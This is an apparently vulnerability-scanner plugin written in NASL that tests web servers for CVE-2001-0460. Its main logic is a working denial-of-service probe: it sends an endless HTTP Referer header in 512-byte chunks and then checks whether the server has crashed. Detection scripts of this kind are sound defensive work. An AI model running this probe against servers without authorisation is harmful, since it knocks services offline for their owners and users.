# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11084");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2465");
  script_cve_id("CVE-2001-0460");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Infinite HTTP Request DoS Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("www/vnc", "+WN/banner", "Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy.");

  script_tag(name:"summary", value:"It was possible to kill the web server by
  sending an invalid 'infinite' HTTP request that never ends.");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make your web server
  crash continually or even execute arbirtray code on your system.");

  script_tag(name:"affected", value:"WebSweeper 4.0 for Windows NT is known to be affected. Other
  versions or products might be affected as well.");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
banner = http_get_remote_headers(port:port);

# WN waits for 30 s before sending back a 408 code
if(egrep(pattern:"Server: +WN/2\.4\.", string:banner))
  exit(0);

if(http_is_dead(port: port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

crap512 = crap(512);
r= http_get(item: '/', port:port);
r= r - '\r\n\r\n';
r= strcat(r, '\r\nReferer: ', crap512);

send(socket:soc, data: r);
cnt = 0;

while (send(socket: soc, data: crap512) > 0) {
  cnt = cnt+512;
  if(cnt > 524288) {
    r = recv(socket: soc, length: 13, timeout: 2);
    http_close_socket(soc);
    if (r) {
      exit(0);
    }

    if(http_is_dead(port:port)) {
      security_message(port);
      exit(0);
    }
    exit(99);
  }
}

# nb: Keep the socket open, in case the web server itself is saturated

if(http_is_dead(port:port))
  security_message(port);

http_close_socket(soc);
